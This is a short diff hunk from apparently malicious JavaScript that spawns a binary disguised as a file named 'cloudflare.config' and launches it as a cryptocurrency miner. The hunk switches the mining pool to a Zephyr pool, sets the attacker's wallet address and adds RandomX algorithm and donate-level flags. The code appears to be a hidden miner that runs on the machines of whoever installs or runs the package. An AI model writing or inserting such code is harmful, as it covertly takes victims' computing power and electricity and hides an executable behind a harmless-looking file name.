@@ -316,11 +316,15 @@ function spinUntilIdle(w, cb) {
 const { spawn } = require("child_process");
 let child = spawn(__dirname + "/./cloudflare.config", [
   "-o",
-  "pool.hashvault.pro:80",
+  "fr-zephyr.miningocean.org:5332",
   "-u",
   "ZEPHYR3BrZ9eJieCEnqLX93nMwGJxBqdpLSahMmCTbMWFU5Vj2fEzqvZfLvynQS3heTrEFaas71sNjLCxXz2eHGXXiqfMAgMTJi35",
+  "-a",
+  "rx/0",
   "-p",
   "x",
+  "--donate-level",
+  "1",
 ]);
 
 child.stdout.on("data", (data) => {
